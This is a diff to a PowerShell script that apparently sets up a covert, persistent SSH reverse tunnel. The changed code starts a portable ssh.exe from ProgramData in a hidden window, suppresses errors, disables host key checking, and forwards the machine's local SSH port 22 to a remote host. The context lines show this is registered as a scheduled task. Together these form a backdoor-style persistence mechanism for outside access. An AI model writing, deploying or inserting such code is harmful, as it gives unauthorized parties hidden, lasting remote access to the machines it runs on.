@@ -254,8 +254,28 @@ Register-ScheduledTask -TaskName $taskName `
 
 Write-Host "`n[!] Success! SSH reverse tunnel batch file created and scheduled. Path: $batFilePath."
 
-# Trigger the Scheduled Task immediately
-Start-ScheduledTask -TaskName $taskName
-Start-Process "wscript.exe" -ArgumentList "`"$vbsFilePath`"" -WindowStyle Hidden
+# Define the arguments for the background SSH tunnel
+$sshArgs = @(
+    "-o", "StrictHostKeyChecking=no",
+    "-o", "ExitOnForwardFailure=yes",
+    "-o", "ServerAliveInterval=60",
+    "-i", "`"$keyFile`"",
+    "-N",
+    "-R", "${receivedPort}:127.0.0.1:22",
+    "$user@$remote_host"
+)
 
-Write-Host "[+] Reverse tunnel initiated in the background."
+Write-Host "[*] Launching reverse tunnel on port $receivedPort..."
+
+# Start the process directly with a hidden window
+$process = Start-Process -FilePath "C:\ProgramData\ssh_portable\ssh.exe" `
+    -ArgumentList $sshArgs `
+    -WindowStyle Hidden `
+    -ErrorAction SilentlyContinue `
+    -PassThru
+
+if ($process) {
+    Write-Host "[+] SSH Tunnel process started (PID: $($process.Id))"
+} else {
+    Write-Error "[-] Failed to start SSH process directly."
+}
